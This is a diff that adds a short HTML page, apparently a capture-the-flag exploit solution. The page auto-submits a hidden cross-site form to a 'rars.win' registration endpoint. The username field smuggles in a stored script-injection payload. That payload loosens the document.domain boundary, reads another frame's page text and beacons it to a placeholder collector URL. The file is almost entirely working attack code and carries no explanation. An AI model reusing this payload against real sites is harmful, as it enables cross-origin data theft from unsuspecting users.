@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <script>
+            let form = document.createElement("form");
+            form.method = "POST";
+            form.action = "https://securestorage.rars.win/api/register";
+            form.target = "target";
+
+            let user = document.createElement("input");
+            user.type = "text";
+            user.name = "user";
+            user.value = `<script>window.addEventListener('load', () => {window.frames[0].postMessage(["document.domain", "rars.win"], "https://secureenclave.rars.win/"); document.domain = "rars.win"; setTimeout(() => navigator.sendBeacon("<REQUESTBIN URL HERE>", window.frames[0].document.body.innerText), 500);}); /* ${Math.random()} */ </` + `script>`;
+            form.appendChild(user);
+
+            let pass = document.createElement("input");
+            pass.type = "text";
+            pass.name = "pass";
+            pass.value = "12345"; 
+            form.appendChild(pass);
+
+            document.body.appendChild(form);
+
+            window.open('', 'target');
+            form.submit();
+        </script>
+    </body>
+</html>
